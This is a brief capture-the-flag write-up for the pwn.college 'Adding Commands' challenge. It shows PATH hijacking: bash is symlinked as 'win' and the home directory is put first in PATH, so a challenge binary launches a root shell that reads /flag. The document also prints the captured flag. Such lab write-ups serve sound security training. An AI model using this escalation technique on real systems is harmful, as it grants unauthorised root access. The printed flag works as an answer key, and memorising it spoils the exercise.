# Adding Commands

## Procedure
i started the challenge pwn.college
as per the question.  
then i typed `ln -s /usr/bin/bash ./win` and then i used  `PATH=/home/hacker/:$PATH` and then i typed `/challenge/run` and then i typed ` cat /flag` 
then i pasted my flag to the website.

## Bash
`                                                                             Connected!
hacker@path~adding-commands:~$ ln -s /usr/bin/bash ./win
hacker@path~adding-commands:~$ PATH=/home/hacker/:$PATH
hacker@path~adding-commands:~$ /challenge/run
Invoking 'win'....
root@path~adding-commands:~# id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
root@path~adding-commands:~# cat /flag
pwn.college{wCsPJxej8ERnzinFDHpDhNno6yw.dZzNyUDL3kTN0czW}`

## References
used this yt video https://youtu.be/JcllurbTrNo?si=drf1pH9SZiR_7KT9 
